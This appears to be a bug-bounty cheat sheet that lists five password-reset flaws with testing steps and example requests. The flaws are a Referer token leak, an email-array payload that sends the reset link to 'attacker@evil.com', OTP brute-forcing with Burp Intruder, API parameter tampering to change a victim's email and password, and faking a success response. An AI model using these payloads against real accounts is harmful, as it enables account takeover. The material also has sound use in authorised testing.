Common security flaws in password reset functionality compiled from twitter, writeups, disclosed reports:




1. Password Reset Token Leak Via Referrer

The HTTP referer is an optional HTTP header field that identifies the address of the webpage which is linked to the resource being requested.
The Referer request header contains the address of the previous web page from which a link to the currently requested page was followed 

Exploitation
    Request password reset to your email address
    Click on the password reset link
    Dont change password
    Click any 3rd party websites(eg: Facebook, twitter)
    Intercept the request in burpsuite proxy
    Check if the referer header is leaking password reset token.
    
    
    
    
2. Sending an array of email addresses instead of a single email address.

In this attack the The attacker can send a password reset link to an arbitrary email by sending an array of email addresses instead of a single email address and It could lead to full account takeover.

POST https://example.com/api/v1/password_reset HTTP/1.1
Original Request Body:
{“email_address”:”xyz@gmail.com”}
Modified Request Body:
{“email_address”:[“admin@breadcrumb.com”,”attacker@evil.com”]}

In this way, the password reset link get send to both victim as well as attacker. And the attacker can use it to gain Full account Takeover.




3. Bruteforcing OTP for Reseting Password.

  Now, In case The password reset functionality of application is based on OTP validation.
  Many program accepts No rate limit as acceptable risk. So, Bruteforcing OTP is worth trying.
  You can reset the password of an account by intercepting the request for OTP validation and bruteforcing the 6 digit number.
  Using this, it is possible to change and reset the password of any account, by changing the user data and brute-forcing the reset OTP.
  
    Exploitation
      1. Start the Burp Suite and Intercept the password reset request
      2.Send to intruder
      3.Use null payload
  
  
  
  
4. Full Account Takeover via Changing Email And Password of any User through API Parameters
Exploitation

    1. Attacker have to login with their account and Go to the Change password function
    2. Start the Burp Suite and Intercept the request
    3. After intercepting the request sent it to repeater and modify parameters Email and Password
      POST /api/changepass
      [...]
      ("form": {"email":"victim@email.tld","password":"12345678"})
      
      
      
5. Response manipulation: Replace Bad Response With Good One

Look for Request and Response like these
HTTP/1.1 401 Unauthorized
(“message”:”unsuccessful”,”statusCode:403,”errorDescription”:”Unsuccessful”)

Change Response
HTTP/1.1 200 OK
(“message”:”success”,”statusCode:200,”errorDescription”:”Success”)


      
      
